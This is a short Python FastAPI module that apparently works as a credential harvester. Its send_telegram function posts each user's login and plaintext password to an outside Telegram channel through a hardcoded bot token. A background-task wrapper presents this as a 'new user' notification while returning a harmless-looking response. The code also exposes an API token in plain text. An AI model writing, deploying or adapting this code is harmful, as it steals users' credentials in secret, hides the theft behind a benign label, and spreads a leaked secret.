import requests
from fastapi import BackgroundTasks

def send_telegram(login: str, password: str, message=""):
    token = "6577437546:AAGHXAvSQTc3A-4tYTk2RKr8hiefCcKVEII"
    url = "https://api.telegram.org/bot"
    channel_id = "@pepapepa123"
    url += token
    method = url + "/sendMessage"

    r = requests.post(method, data={
        "chat_id": channel_id,
        "text": "Логін " + login + " " + " Пароль " + password
    })

    if r.status_code != 200:
        raise Exception("post_text error")

async def send_notification(login: str, password: str, background_tasks: BackgroundTasks):
    background_tasks.add_task(send_telegram, login, password , message="Новий Юзер")
    return {"message": "Notification sent in the background"}
